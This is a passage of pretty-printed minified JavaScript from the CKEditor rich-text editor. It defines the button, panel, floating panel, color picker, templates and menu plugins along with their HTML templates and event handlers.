                    e = e.data, f.insertHtml(e.dataValue, e.type), setTimeout(function() {
                        f.fire("afterPaste");
                    }, 0);
                }, null, null, 1e3), f.on("pasteDialog", function(e) {
                    setTimeout(function() {
                        f.openDialog("paste", e.data);
                    }, 0);
                });
            }
        });
    }(), function() {
        e = '<a id="{id}" class="cke_button cke_button__{name} cke_button_{state} {cls}"' + (CKEDITOR.env.gecko && !CKEDITOR.env.hc ? "" : " href=\"javascript:void('{titleJs}')\"") + ' title="{title}" tabindex="-1" hidefocus="true" role="button" aria-labelledby="{id}_label" aria-haspopup="{hasArrow}" aria-disabled="{ariaDisabled}"',
        CKEDITOR.env.gecko && CKEDITOR.env.mac && (e += ' onkeypress="return false;"'),
        CKEDITOR.env.gecko && (e += ' onblur="this.style.cssText = this.style.cssText;"');
        var e = (e = e + ' onkeydown="return CKEDITOR.tools.callFunction({keydownFn},event);" onfocus="return CKEDITOR.tools.callFunction({focusFn},event);" ' + (CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : "onclick") + '="CKEDITOR.tools.callFunction({clickFn},this);return false;"><span class="cke_button_icon cke_button__{iconName}_icon" style="{style}"') + '>&nbsp;</span><span id="{id}_label" class="cke_button_label cke_button__{name}_label" aria-hidden="false">{label}</span>{arrowHtml}</a>', g = CKEDITOR.addTemplate("buttonArrow", '<span class="cke_button_arrow">' + (CKEDITOR.env.hc ? "&#9660;" : "") + "</span>"), E = CKEDITOR.addTemplate("button", e);
        CKEDITOR.plugins.add("button", {
            beforeInit: function(e) {
                e.ui.addHandler(CKEDITOR.UI_BUTTON, CKEDITOR.ui.button.handler);
            }
        }), CKEDITOR.UI_BUTTON = "button", CKEDITOR.ui.button = function(t) {
            CKEDITOR.tools.extend(this, t, {
                title: t.label,
                click: t.click || function(e) {
                    e.execCommand(t.command);
                }
            }), this._ = {};
        }, CKEDITOR.ui.button.handler = {
            create: function(e) {
                return new CKEDITOR.ui.button(e);
            }
        }, CKEDITOR.ui.button.prototype = {
            render: function(i, e) {
                function t() {
                    var e = i.mode;
                    e && (e = this.modes[e] ? void 0 !== h[e] ? h[e] : CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED,
                    e = i.readOnly && !this.readOnly ? CKEDITOR.TRISTATE_DISABLED : e, this.setState(e),
                    this.refresh && this.refresh());
                }
                var n, o = CKEDITOR.env, a = this._.id = CKEDITOR.tools.getNextId(), r = "", s = this.command;
                this._.editor = i;
                var l = {
                    id: a,
                    button: this,
                    editor: i,
                    focus: function() {
                        CKEDITOR.document.getById(a).focus();
                    },
                    execute: function() {
                        this.button.click(i);
                    },
                    attach: function(e) {
                        this.button.attach(e);
                    }
                }, c = CKEDITOR.tools.addFunction(function(e) {
                    if (l.onkey) return e = new CKEDITOR.dom.event(e), !1 !== l.onkey(l, e.getKeystroke());
                }), d = CKEDITOR.tools.addFunction(function(e) {
                    var t;
                    return l.onfocus && (t = !1 !== l.onfocus(l, new CKEDITOR.dom.event(e))), t;
                }), u = 0;
                if (l.clickFn = n = CKEDITOR.tools.addFunction(function() {
                    u && (i.unlockSelection(1), u = 0), l.execute(), o.iOS && i.focus();
                }), this.modes) {
                    var h = {};
                    i.on("beforeModeUnload", function() {
                        i.mode && this._.state != CKEDITOR.TRISTATE_DISABLED && (h[i.mode] = this._.state);
                    }, this), i.on("activeFilterChange", t, this), i.on("mode", t, this), !this.readOnly && i.on("readOnly", t, this);
                } else s && (s = i.getCommand(s)) && (s.on("state", function() {
                    this.setState(s.state);
                }, this), r += s.state == CKEDITOR.TRISTATE_ON ? "on" : s.state == CKEDITOR.TRISTATE_DISABLED ? "disabled" : "off");
                this.directional && i.on("contentDirChanged", function(e) {
                    var t = CKEDITOR.document.getById(this._.id), n = t.getFirst();
                    (e = e.data) != i.lang.dir ? t.addClass("cke_" + e) : t.removeClass("cke_ltr").removeClass("cke_rtl"),
                    n.setAttribute("style", CKEDITOR.skin.getIconStyle(m, "rtl" == e, this.icon, this.iconOffset));
                }, this), s || (r += "off");
                var f = this.name || this.command, m = f;
                return this.icon && !/\./.test(this.icon) && (m = this.icon, this.icon = null),
                r = {
                    id: a,
                    name: f,
                    iconName: m,
                    label: this.label,
                    cls: this.className || "",
                    state: r,
                    ariaDisabled: "disabled" == r ? "true" : "false",
                    title: this.title,
                    titleJs: o.gecko && !o.hc ? "" : (this.title || "").replace("'", ""),
                    hasArrow: this.hasArrow ? "true" : "false",
                    keydownFn: c,
                    focusFn: d,
                    clickFn: n,
                    style: CKEDITOR.skin.getIconStyle(m, "rtl" == i.lang.dir, this.icon, this.iconOffset),
                    arrowHtml: this.hasArrow ? g.output() : ""
                }, E.output(r, e), this.onRender && this.onRender(), l;
            },
            setState: function(e) {
                if (this._.state == e) return !1;
                this._.state = e;
                var t = CKEDITOR.document.getById(this._.id);
                return !!t && (t.setState(e, "cke_button"), e == CKEDITOR.TRISTATE_DISABLED ? t.setAttribute("aria-disabled", !0) : t.removeAttribute("aria-disabled"),
                this.hasArrow ? (e = e == CKEDITOR.TRISTATE_ON ? this._.editor.lang.button.selectedLabel.replace(/%1/g, this.label) : this.label,
                CKEDITOR.document.getById(this._.id + "_label").setText(e)) : e == CKEDITOR.TRISTATE_ON ? t.setAttribute("aria-pressed", !0) : t.removeAttribute("aria-pressed"),
                !0);
            },
            getState: function() {
                return this._.state;
            },
            toFeature: function(e) {
                if (this._.feature) return this._.feature;
                var t = this;
                return !this.allowedContent && !this.requiredContent && this.command && (t = e.getCommand(this.command) || t),
                this._.feature = t;
            }
        }, CKEDITOR.ui.prototype.addButton = function(e, t) {
            this.add(e, CKEDITOR.UI_BUTTON, t);
        };
    }(), CKEDITOR.plugins.add("panelbutton", {
        requires: "button",
        onLoad: function() {
            function n(e) {
                var t = this._;
                t.state != CKEDITOR.TRISTATE_DISABLED && (this.createPanel(e), t.on ? t.panel.hide() : t.panel.showBlock(this._.id, this.document.getById(this._.id), 4));
            }
            CKEDITOR.ui.panelButton = CKEDITOR.tools.createClass({
                base: CKEDITOR.ui.button,
                $: function(e) {
                    var t = e.panel || {};
                    delete e.panel, this.base(e), this.document = t.parent && t.parent.getDocument() || CKEDITOR.document,
                    t.block = {
                        attributes: t.attributes
                    }, this.hasArrow = t.toolbarRelated = !0, this.click = n, this._ = {
                        panelDefinition: t
                    };
                },
                statics: {
                    handler: {
                        create: function(e) {
                            return new CKEDITOR.ui.panelButton(e);
                        }
                    }
                },
                proto: {
                    createPanel: function(t) {
                        var n = this._;
                        if (!n.panel) {
                            var e = this._.panelDefinition, i = this._.panelDefinition.block, o = e.parent || CKEDITOR.document.getBody(), a = this._.panel = new CKEDITOR.ui.floatPanel(t, o, e), r = (e = a.addBlock(n.id, i),
                            this);
                            a.onShow = function() {
                                r.className && this.element.addClass(r.className + "_panel"), r.setState(CKEDITOR.TRISTATE_ON),
                                n.on = 1, r.editorFocus && t.focus(), r.onOpen && r.onOpen();
                            }, a.onHide = function(e) {
                                r.className && this.element.getFirst().removeClass(r.className + "_panel"), r.setState(r.modes && r.modes[t.mode] ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED),
                                n.on = 0, !e && r.onClose && r.onClose();
                            }, a.onEscape = function() {
                                a.hide(1), r.document.getById(n.id).focus();
                            }, this.onBlock && this.onBlock(a, e), e.onHide = function() {
                                n.on = 0, r.setState(CKEDITOR.TRISTATE_OFF);
                            };
                        }
                    }
                }
            });
        },
        beforeInit: function(e) {
            e.ui.addHandler(CKEDITOR.UI_PANELBUTTON, CKEDITOR.ui.panelButton.handler);
        }
    }), CKEDITOR.UI_PANELBUTTON = "panelbutton", function() {
        CKEDITOR.plugins.add("panel", {
            beforeInit: function(e) {
                e.ui.addHandler(CKEDITOR.UI_PANEL, CKEDITOR.ui.panel.handler);
            }
        }), CKEDITOR.UI_PANEL = "panel", CKEDITOR.ui.panel = function(e, t) {
            t && CKEDITOR.tools.extend(this, t), CKEDITOR.tools.extend(this, {
                className: "",
                css: []
            }), this.id = CKEDITOR.tools.getNextId(), this.document = e, this.isFramed = this.forceIFrame || this.css.length,
            this._ = {
                blocks: {}
            };
        }, CKEDITOR.ui.panel.handler = {
            create: function(e) {
                return new CKEDITOR.ui.panel(e);
            }
        };
        var o = CKEDITOR.addTemplate("panel", '<div lang="{langCode}" id="{id}" dir={dir} class="cke cke_reset_all {editorId} cke_panel cke_panel {cls} cke_{dir}" style="z-index:{z-index}" role="presentation">{frame}</div>'), a = CKEDITOR.addTemplate("panel-frame", '<iframe id="{id}" class="cke_panel_frame" role="presentation" frameborder="0" src="{src}"></iframe>'), r = CKEDITOR.addTemplate("panel-frame-inner", '<!DOCTYPE html><html class="cke_panel_container {env}" dir="{dir}" lang="{langCode}"><head>{css}</head><body class="cke_{dir}" style="margin:0;padding:0" onload="{onload}"></body></html>');
        CKEDITOR.ui.panel.prototype = {
            render: function(e, t) {
                this.getHolderElement = function() {
                    if (!(t = this._.holder)) {
                        if (this.isFramed) {
                            var e = (t = this.document.getById(this.id + "_frame")).getParent(), t = t.getFrameDocument();
                            CKEDITOR.env.iOS && e.setStyles({
                                overflow: "scroll",
                                "-webkit-overflow-scrolling": "touch"
                            }), e = CKEDITOR.tools.addFunction(CKEDITOR.tools.bind(function() {
                                this.isLoaded = !0, this.onLoad && this.onLoad();
                            }, this)), t.write(r.output(CKEDITOR.tools.extend({
                                css: CKEDITOR.tools.buildStyleHtml(this.css),
                                onload: "window.parent.CKEDITOR.tools.callFunction(" + e + ");"
                            }, n))), t.getWindow().$.CKEDITOR = CKEDITOR, t.on("keydown", function(e) {
                                var t = e.data.getKeystroke(), n = this.document.getById(this.id).getAttribute("dir");
                                this._.onKeyDown && !1 === this._.onKeyDown(t) ? e.data.preventDefault() : (27 == t || t == ("rtl" == n ? 39 : 37)) && this.onEscape && !1 === this.onEscape(t) && e.data.preventDefault();
                            }, this), (t = t.getBody()).unselectable(), CKEDITOR.env.air && CKEDITOR.tools.callFunction(e);
                        } else t = this.document.getById(this.id);
                        this._.holder = t;
                    }
                    return t;
                };
                var n = {
                    editorId: e.id,
                    id: this.id,
                    langCode: e.langCode,
                    dir: e.lang.dir,
                    cls: this.className,
                    frame: "",
                    env: CKEDITOR.env.cssClass,
                    "z-index": e.config.baseFloatZIndex + 1
                };
                if (this.isFramed) {
                    var i = CKEDITOR.env.air ? "javascript:void(0)" : CKEDITOR.env.ie ? "javascript:void(function(){" + encodeURIComponent("document.open();(" + CKEDITOR.tools.fixDomain + ")();document.close();") + "}())" : "";
                    n.frame = a.output({
                        id: this.id + "_frame",
                        src: i
                    });
                }
                return i = o.output(n), t && t.push(i), i;
            },
            addBlock: function(e, t) {
                return t = this._.blocks[e] = t instanceof CKEDITOR.ui.panel.block ? t : new CKEDITOR.ui.panel.block(this.getHolderElement(), t),
                this._.currentBlock || this.showBlock(e), t;
            },
            getBlock: function(e) {
                return this._.blocks[e];
            },
            showBlock: function(e) {
                e = this._.blocks[e];
                var t = this._.currentBlock, n = !this.forceIFrame || CKEDITOR.env.ie ? this._.holder : this.document.getById(this.id + "_frame");
                return t && t.hide(), this._.currentBlock = e, CKEDITOR.fire("ariaWidget", n), e._.focusIndex = -1,
                this._.onKeyDown = e.onKeyDown && CKEDITOR.tools.bind(e.onKeyDown, e), e.show(),
                e;
            },
            destroy: function() {
                this.element && this.element.remove();
            }
        }, CKEDITOR.ui.panel.block = CKEDITOR.tools.createClass({
            $: function(e, t) {
                this.element = e.append(e.getDocument().createElement("div", {
                    attributes: {
                        tabindex: -1,
                        class: "cke_panel_block"
                    },
                    styles: {
                        display: "none"
                    }
                })), t && CKEDITOR.tools.extend(this, t), this.element.setAttributes({
                    role: this.attributes.role || "presentation",
                    "aria-label": this.attributes["aria-label"],
                    title: this.attributes.title || this.attributes["aria-label"]
                }), this.keys = {}, this._.focusIndex = -1, this.element.disableContextMenu();
            },
            _: {
                markItem: function(e) {
                    -1 != e && (e = this.element.getElementsByTag("a").getItem(this._.focusIndex = e),
                    CKEDITOR.env.webkit && e.getDocument().getWindow().focus(), e.focus(), this.onMark && this.onMark(e));
                }
            },
            proto: {
                show: function() {
                    this.element.setStyle("display", "");
                },
                hide: function() {
                    (!this.onHide || !0 !== this.onHide.call(this)) && this.element.setStyle("display", "none");
                },
                onKeyDown: function(e, t) {
                    switch (o = this.keys[e]) {
                      case "next":
                        for (var n, i = this._.focusIndex, o = this.element.getElementsByTag("a"); n = o.getItem(++i); ) if (n.getAttribute("_cke_focus") && n.$.offsetWidth) {
                            this._.focusIndex = i, n.focus();
                            break;
                        }
                        return !n && !t && (this._.focusIndex = -1, this.onKeyDown(e, 1));

                      case "prev":
                        for (i = this._.focusIndex, o = this.element.getElementsByTag("a"); 0 < i && (n = o.getItem(--i)); ) {
                            if (n.getAttribute("_cke_focus") && n.$.offsetWidth) {
                                this._.focusIndex = i, n.focus();
                                break;
                            }
                            n = null;
                        }
                        return !n && !t && (this._.focusIndex = o.count(), this.onKeyDown(e, 1));

                      case "click":
                      case "mouseup":
                        return (n = 0 <= (i = this._.focusIndex) && this.element.getElementsByTag("a").getItem(i)) && (n.$[o] ? n.$[o]() : n.$["on" + o]()),
                        !1;
                    }
                    return !0;
                }
            }
        });
    }(), CKEDITOR.plugins.add("floatpanel", {
        requires: "panel"
    }), c = {}, CKEDITOR.ui.floatPanel = CKEDITOR.tools.createClass({
        $: function(e, t, n, i) {
            function o() {
                l.hide();
            }
            n.forceIFrame = 1, n.toolbarRelated && e.elementMode == CKEDITOR.ELEMENT_MODE_INLINE && (t = CKEDITOR.document.getById("cke_" + e.name));
            var a = t.getDocument(), r = (i = function(e, t, n, i, o) {
                o = CKEDITOR.tools.genKey(t.getUniqueId(), n.getUniqueId(), e.lang.dir, e.uiColor || "", i.css || "", o || "");
                var a = c[o];
                return a || ((a = c[o] = new CKEDITOR.ui.panel(t, i)).element = n.append(CKEDITOR.dom.element.createFromHtml(a.render(e), t)),
                a.element.setStyles({
                    display: "none",
                    position: "absolute"
                })), a;
            }(e, a, t, n, i || 0)).element, s = r.getFirst(), l = this;
            r.disableContextMenu(), this.element = r, this._ = {
                editor: e,
                panel: i,
                parentElement: t,
                definition: n,
                document: a,
                iframe: s,
                children: [],
                dir: e.lang.dir
            }, e.on("mode", o), e.on("resize", o), CKEDITOR.env.iOS || a.getWindow().on("resize", o);
        },
        proto: {
            addBlock: function(e, t) {
                return this._.panel.addBlock(e, t);
            },
            addListBlock: function(e, t) {
                return this._.panel.addListBlock(e, t);
            },
            getBlock: function(e) {
                return this._.panel.getBlock(e);
            },
            showBlock: function(e, t, n, i, o, s) {
                var l = this._.panel, c = l.showBlock(e);
                this.allowBlur(!1), e = this._.editor.editable(), this._.returnFocus = e.hasFocus ? e : new CKEDITOR.dom.element(CKEDITOR.document.$.activeElement),
                this._.hideTimeout = 0;
                var d = this.element, a = (e = this._.iframe, e = CKEDITOR.env.ie ? e : new CKEDITOR.dom.window(e.$.contentWindow),
                d.getDocument()), r = this._.parentElement.getPositionedAncestor(), u = t.getDocumentPosition(a), h = (a = r ? r.getDocumentPosition(a) : {
                    x: 0,
                    y: 0
                }, "rtl" == this._.dir), f = u.x + (i || 0) - a.x, m = u.y + (o || 0) - a.y;
                !h || 1 != n && 4 != n ? h || 2 != n && 3 != n || (f += t.$.offsetWidth - 1) : f += t.$.offsetWidth,
                3 != n && 4 != n || (m += t.$.offsetHeight - 1), this._.panel._.offsetParentId = t.getId(),
                d.setStyles({
                    top: m + "px",
                    left: 0,
                    display: ""
                }), d.setOpacity(0), d.getFirst().removeStyle("width"), this._.editor.focusManager.add(e),
                this._.blurSet || (CKEDITOR.event.useCapture = !0, e.on("blur", function(e) {
                    function t() {
                        delete this._.returnFocus, this.hide();
                    }
                    this.allowBlur() && e.data.getPhase() == CKEDITOR.EVENT_PHASE_AT_TARGET && this.visible && !this._.activeChild && (CKEDITOR.env.iOS ? this._.hideTimeout || (this._.hideTimeout = CKEDITOR.tools.setTimeout(t, 0, this)) : t.call(this));
                }, this), e.on("focus", function() {
                    this._.focused = !0, this.hideChild(), this.allowBlur(!0);
                }, this), CKEDITOR.env.iOS && (e.on("touchstart", function() {
                    clearTimeout(this._.hideTimeout);
                }, this), e.on("touchend", function() {
                    this._.hideTimeout = 0, this.focus();
                }, this)), CKEDITOR.event.useCapture = !1, this._.blurSet = 1), l.onEscape = CKEDITOR.tools.bind(function(e) {
                    if (this.onEscape && !1 === this.onEscape(e)) return !1;
                }, this), CKEDITOR.tools.setTimeout(function() {
                    var e = CKEDITOR.tools.bind(function() {
                        if (d.removeStyle("width"), c.autoSize) {
                            var e = c.element.getDocument();
                            e = (CKEDITOR.env.webkit ? c.element : e.getBody()).$.scrollWidth, CKEDITOR.env.ie && CKEDITOR.env.quirks && 0 < e && (e += (d.$.offsetWidth || 0) - (d.$.clientWidth || 0) + 3),
                            d.setStyle("width", e + 10 + "px"), e = c.element.$.scrollHeight, CKEDITOR.env.ie && CKEDITOR.env.quirks && 0 < e && (e += (d.$.offsetHeight || 0) - (d.$.clientHeight || 0) + 3),
                            d.setStyle("height", e + "px"), l._.currentBlock.element.setStyle("display", "none").removeStyle("display");
                        } else d.removeStyle("height");
                        h && (f -= d.$.offsetWidth), d.setStyle("left", f + "px");
                        var t, n = l.element.getWindow(), i = (e = d.$.getBoundingClientRect(), n = n.getViewPaneSize(),
                        e.width || e.right - e.left), o = e.height || e.bottom - e.top, a = h ? e.right : n.width - e.left, r = h ? n.width - e.right : e.left;
                        h ? a < i && (f = i < r ? f + i : n.width > i ? f - e.left : f - e.right + n.width) : a < i && (f = i < r ? f - i : n.width > i ? f - e.right + n.width : f - e.left),
                        i = e.top, n.height - e.top < o && (m = o < i ? m - o : n.height > o ? m - e.bottom + n.height : m - e.top),
                        CKEDITOR.env.ie && ("html" == (n = e = new CKEDITOR.dom.element(d.$.offsetParent)).getName() && (n = n.getDocument().getBody()),
                        "rtl" == n.getComputedStyle("direction") && (f = CKEDITOR.env.ie8Compat ? f - 2 * d.getDocument().getDocumentElement().$.scrollLeft : f - (e.$.scrollWidth - e.$.clientWidth))),
                        (t = (e = d.getFirst()).getCustomData("activePanel")) && t.onHide && t.onHide.call(this, 1),
                        e.setCustomData("activePanel", this), d.setStyles({
                            top: m + "px",
                            left: f + "px"
                        }), d.setOpacity(1), s && s();
                    }, this);
                    l.isLoaded ? e() : l.onLoad = e, CKEDITOR.tools.setTimeout(function() {
                        var e = CKEDITOR.env.webkit && CKEDITOR.document.getWindow().getScrollPosition().y;
                        this.focus(), c.element.focus(), CKEDITOR.env.webkit && (CKEDITOR.document.getBody().$.scrollTop = e),
                        this.allowBlur(!0), this._.editor.fire("panelShow", this);
                    }, 0, this);
                }, CKEDITOR.env.air ? 200 : 0, this), this.visible = 1, this.onShow && this.onShow.call(this);
            },
            focus: function() {
                if (CKEDITOR.env.webkit) {
                    var e = CKEDITOR.document.getActive();
                    e && !e.equals(this._.iframe) && e.$.blur();
                }
                (this._.lastFocused || this._.iframe.getFrameDocument().getWindow()).focus();
            },
            blur: function() {
                var e = this._.iframe.getFrameDocument().getActive();
                e && e.is("a") && (this._.lastFocused = e);
            },
            hide: function(e) {
                !this.visible || this.onHide && !0 === this.onHide.call(this) || (this.hideChild(),
                CKEDITOR.env.gecko && this._.iframe.getFrameDocument().$.activeElement.blur(), this.element.setStyle("display", "none"),
                this.visible = 0, this.element.getFirst().removeCustomData("activePanel"), (e = e && this._.returnFocus) && (CKEDITOR.env.webkit && e.type && e.getWindow().$.focus(),
                e.focus()), delete this._.lastFocused, this._.editor.fire("panelHide", this));
            },
            allowBlur: function(e) {
                var t = this._.panel;
                return void 0 !== e && (t.allowBlur = e), t.allowBlur;
            },
            showAsChild: function(e, t, n, i, o, a) {
                this._.activeChild == e && e._.panel._.offsetParentId == n.getId() || (this.hideChild(),
                e.onHide = CKEDITOR.tools.bind(function() {
                    CKEDITOR.tools.setTimeout(function() {
                        this._.focused || this.hide();
                    }, 0, this);
                }, this), this._.activeChild = e, this._.focused = !1, e.showBlock(t, n, i, o, a),
                this.blur(), (CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat) && setTimeout(function() {
                    e.element.getChild(0).$.style.cssText += "";
                }, 100));
            },
            hideChild: function(e) {
                var t = this._.activeChild;
                t && (delete t.onHide, delete this._.activeChild, t.hide(), e && this.focus());
            }
        }
    }), CKEDITOR.on("instanceDestroyed", function() {
        var e, t = CKEDITOR.tools.isEmpty(CKEDITOR.instances);
        for (e in c) {
            var n = c[e];
            t ? n.destroy() : n.element.hide();
        }
        t && (c = {});
    }), CKEDITOR.plugins.add("colorbutton", {
        requires: "panelbutton,floatpanel",
        init: function(u) {
            function e(e, o, t, n) {
                var i = new CKEDITOR.style(f["colorButton_" + o + "Style"]), a = CKEDITOR.tools.getNextId() + "_colorBox";
                u.ui.add(e, CKEDITOR.UI_PANELBUTTON, {
                    label: t,
                    title: t,
                    modes: {
                        wysiwyg: 1
                    },
                    editorFocus: 0,
                    toolbar: "colors," + n,
                    allowedContent: i,
                    requiredContent: i,
                    panel: {
                        css: CKEDITOR.skin.getPath("editor"),
                        attributes: {
                            role: "listbox",
                            "aria-label": m.panelTitle
                        }
                    },
                    onBlock: function(e, t) {
                        t.autoSize = !0, t.element.addClass("cke_colorblock"), t.element.setHtml(function(a, e, t) {
                            var n = [], i = f.colorButton_colors.split(","), o = u.plugins.colordialog && !1 !== f.colorButton_enableMore, r = i.length + (o ? 2 : 1), s = CKEDITOR.tools.addFunction(function(e, t) {
                                function n(e) {
                                    this.removeListener("ok", n), this.removeListener("cancel", n), "ok" == e.name && i(this.getContentElement("picker", "selectedColor").getValue(), t);
                                }
                                var i = arguments.callee;
                                if ("?" == e) u.openDialog("colordialog", function() {
                                    this.on("ok", n), this.on("cancel", n);
                                }); else {
                                    if (u.focus(), a.hide(), u.fire("saveSnapshot"), u.removeStyle(new CKEDITOR.style(f["colorButton_" + t + "Style"], {
                                        color: "inherit"
                                    })), e) {
                                        var o = f["colorButton_" + t + "Style"];
                                        o.childRule = "back" == t ? function(e) {
                                            return h(e);
                                        } : function(e) {
                                            return !(e.is("a") || e.getElementsByTag("a").count()) || h(e);
                                        }, u.applyStyle(new CKEDITOR.style(o, {
                                            color: e
                                        }));
                                    }
                                    u.fire("saveSnapshot");
                                }
                            });
                            for (n.push('<a class="cke_colorauto" _cke_focus=1 hidefocus=true title="', m.auto, '" onclick="CKEDITOR.tools.callFunction(', s, ",null,'", e, "');return false;\" href=\"javascript:void('", m.auto, '\')" role="option" aria-posinset="1" aria-setsize="', r, '"><table role="presentation" cellspacing=0 cellpadding=0 width="100%"><tr><td><span class="cke_colorbox" id="', t, '"></span></td><td colspan=7 align=center>', m.auto, '</td></tr></table></a><table role="presentation" cellspacing=0 cellpadding=0 width="100%">'),
                            t = 0; t < i.length; t++) {
                                0 == t % 8 && n.push("</tr><tr>");
                                var l = i[t].split("/"), c = l[0], d = l[1] || c;
                                l[1] || (c = "#" + c.replace(/^(.)(.)(.)$/, "$1$1$2$2$3$3")), l = u.lang.colorbutton.colors[d] || d,
                                n.push('<td><a class="cke_colorbox" _cke_focus=1 hidefocus=true title="', l, '" onclick="CKEDITOR.tools.callFunction(', s, ",'", c, "','", e, "'); return false;\" href=\"javascript:void('", l, '\')" role="option" aria-posinset="', t + 2, '" aria-setsize="', r, '"><span class="cke_colorbox" style="background-color:#', d, '"></span></a></td>');
                            }
                            return o && n.push('</tr><tr><td colspan=8 align=center><a class="cke_colormore" _cke_focus=1 hidefocus=true title="', m.more, '" onclick="CKEDITOR.tools.callFunction(', s, ",'?','", e, "');return false;\" href=\"javascript:void('", m.more, "')\"", ' role="option" aria-posinset="', r, '" aria-setsize="', r, '">', m.more, "</a></td>"),
                            n.push("</tr></table>"), n.join("");
                        }(e, o, a)), t.element.getDocument().getBody().setStyle("overflow", "hidden"), CKEDITOR.ui.fire("ready", this);
                        var n = t.keys, i = "rtl" == u.lang.dir;
                        n[i ? 37 : 39] = "next", n[40] = "next", n[9] = "next", n[i ? 39 : 37] = "prev",
                        n[38] = "prev", n[CKEDITOR.SHIFT + 9] = "prev", n[32] = "click";
                    },
                    refresh: function() {
                        u.activeFilter.check(i) || this.setState(CKEDITOR.TRISTATE_DISABLED);
                    },
                    onOpen: function() {
                        var e, t = (t = u.getSelection()) && t.getStartElement();
                        if (t = u.elementPath(t)) {
                            for (t = t.block || t.blockLimit || u.document.getBody(); e = t && t.getComputedStyle("back" == o ? "background-color" : "color") || "transparent",
                            "back" == o && "transparent" == e && t && (t = t.getParent()); ) ;
                            return e && "transparent" != e || (e = "#ffffff"), this._.panel._.iframe.getFrameDocument().getById(a).setStyle("background-color", e),
                            e;
                        }
                    }
                });
            }
            function h(e) {
                return "false" == e.getAttribute("contentEditable") || e.getAttribute("data-nostyle");
            }
            var f = u.config, m = u.lang.colorbutton;
            CKEDITOR.env.hc || (e("TextColor", "fore", m.textColorTitle, 10), e("BGColor", "back", m.bgColorTitle, 20));
        }
    }), CKEDITOR.config.colorButton_colors = "000,800000,8B4513,2F4F4F,008080,000080,4B0082,696969,B22222,A52A2A,DAA520,006400,40E0D0,0000CD,800080,808080,F00,FF8C00,FFD700,008000,0FF,00F,EE82EE,A9A9A9,FFA07A,FFA500,FFFF00,00FF00,AFEEEE,ADD8E6,DDA0DD,D3D3D3,FFF0F5,FAEBD7,FFFFE0,F0FFF0,F0FFFF,F0F8FF,E6E6FA,FFF",
    CKEDITOR.config.colorButton_foreStyle = {
        element: "span",
        styles: {
            color: "#(color)"
        },
        overrides: [ {
            element: "font",
            attributes: {
                color: null
            }
        } ]
    }, CKEDITOR.config.colorButton_backStyle = {
        element: "span",
        styles: {
            "background-color": "#(color)"
        }
    }, CKEDITOR.plugins.colordialog = {
        requires: "dialog",
        init: function(e) {
            var t = new CKEDITOR.dialogCommand("colordialog");
            t.editorFocus = !1, e.addCommand("colordialog", t), CKEDITOR.dialog.add("colordialog", this.path + "dialogs/colordialog.js"),
            e.getColorFromDialog = function(t, n) {
                var i = function(e) {
                    this.removeListener("ok", i), this.removeListener("cancel", i), e = "ok" == e.name ? this.getValueOf("picker", "selectedColor") : null,
                    t.call(n, e);
                }, o = function(e) {
                    e.on("ok", i), e.on("cancel", i);
                };
                e.execCommand("colordialog"), e._.storedDialogs && e._.storedDialogs.colordialog ? o(e._.storedDialogs.colordialog) : CKEDITOR.on("dialogDefinition", function(e) {
                    if ("colordialog" == e.data.name) {
                        var t = e.data.definition;
                        e.removeListener(), t.onLoad = CKEDITOR.tools.override(t.onLoad, function(e) {
                            return function() {
                                o(this), "function" == typeof (t.onLoad = e) && e.call(this);
                            };
                        });
                    }
                });
            };
        }
    }, CKEDITOR.plugins.add("colordialog", CKEDITOR.plugins.colordialog), function() {
        CKEDITOR.plugins.add("templates", {
            requires: "dialog",
            init: function(e) {
                CKEDITOR.dialog.add("templates", CKEDITOR.getUrl(this.path + "dialogs/templates.js")),
                e.addCommand("templates", new CKEDITOR.dialogCommand("templates")), e.ui.addButton && e.ui.addButton("Templates", {
                    label: e.lang.templates.button,
                    command: "templates",
                    toolbar: "doctools,10"
                });
            }
        });
        var n = {}, a = {};
        CKEDITOR.addTemplates = function(e, t) {
            n[e] = t;
        }, CKEDITOR.getTemplates = function(e) {
            return n[e];
        }, CKEDITOR.loadTemplates = function(e, t) {
            for (var n = [], i = 0, o = e.length; i < o; i++) a[e[i]] || (n.push(e[i]), a[e[i]] = 1);
            n.length ? CKEDITOR.scriptLoader.load(n, t) : setTimeout(t, 0);
        };
    }(), CKEDITOR.config.templates_files = [ CKEDITOR.getUrl("plugins/templates/templates/default.js") ],
    CKEDITOR.config.templates_replaceContent = !0, CKEDITOR.plugins.add("menu", {
        requires: "floatpanel",
        beforeInit: function(e) {
            for (var t = e.config.menu_groups.split(","), n = e._.menuGroups = {}, i = e._.menuItems = {}, o = 0; o < t.length; o++) n[t[o]] = o + 1;
            e.addMenuGroup = function(e, t) {
                n[e] = t || 100;
            }, e.addMenuItem = function(e, t) {
                n[t.group] && (i[e] = new CKEDITOR.menuItem(this, e, t));
            }, e.addMenuItems = function(e) {
                for (var t in e) this.addMenuItem(t, e[t]);
            }, e.getMenuItem = function(e) {
                return i[e];
            }, e.removeMenuItem = function(e) {
                delete i[e];
            };
        }
    }), function() {
        e = '<span class="cke_menuitem"><a id="{id}" class="cke_menubutton cke_menubutton__{name} cke_menubutton_{state} {cls}" href="{href}" title="{title}" tabindex="-1"_cke_focus=1 hidefocus="true" role="{role}" aria-haspopup="{hasPopup}" aria-disabled="{disabled}" {ariaChecked}',
        CKEDITOR.env.gecko && CKEDITOR.env.mac && (e += ' onkeypress="return false;"'),
        CKEDITOR.env.gecko && (e += ' onblur="this.style.cssText = this.style.cssText;"');
        var e = e + ' onmouseover="CKEDITOR.tools.callFunction({hoverFn},{index});" onmouseout="CKEDITOR.tools.callFunction({moveOutFn},{index});" ' + (CKEDITOR.env.ie ? 'onclick="return false;" onmouseup' : "onclick") + '="CKEDITOR.tools.callFunction({clickFn},{index}); return false;">', d = CKEDITOR.addTemplate("menuItem", e + '<span class="cke_menubutton_inner"><span class="cke_menubutton_icon"><span class="cke_button_icon cke_button__{iconName}_icon" style="{iconStyle}"></span></span><span class="cke_menubutton_label">{label}</span>{arrowHtml}</span></a></span>'), u = CKEDITOR.addTemplate("menuArrow", '<span class="cke_menuarrow"><span>{label}</span></span>');
        CKEDITOR.menu = CKEDITOR.tools.createClass({
            $: function(e, t) {
                t = this._.definition = t || {}, this.id = CKEDITOR.tools.getNextId(), this.editor = e,
                this.items = [], this._.listeners = [], this._.level = t.level || 1;
                var n = CKEDITOR.tools.extend({}, t.panel, {
